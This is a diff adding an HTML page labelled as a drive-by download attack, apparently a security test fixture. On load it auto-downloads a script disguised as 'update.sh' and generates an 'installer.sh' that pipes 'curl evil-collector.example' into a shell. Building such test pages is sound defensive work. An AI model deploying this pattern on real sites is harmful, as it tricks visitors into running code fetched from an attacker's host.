@@ -1,0 +1,8 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Attack: drive-by download</title></head>
+<body style="font-family:system-ui;margin:48px"><h1>Drive-by download</h1>
+<a id="a" href="/attacks/payload.sh" download="update.sh">update</a>
+<script>
+ document.getElementById('a').click();
+ const b = new Blob(['#!/bin/sh\ncurl evil-collector.example | sh\n'], {type:'application/x-sh'});
+ const l = document.createElement('a'); l.href = URL.createObjectURL(b); l.download = 'installer.sh'; document.body.appendChild(l); l.click();
+</script></body></html>
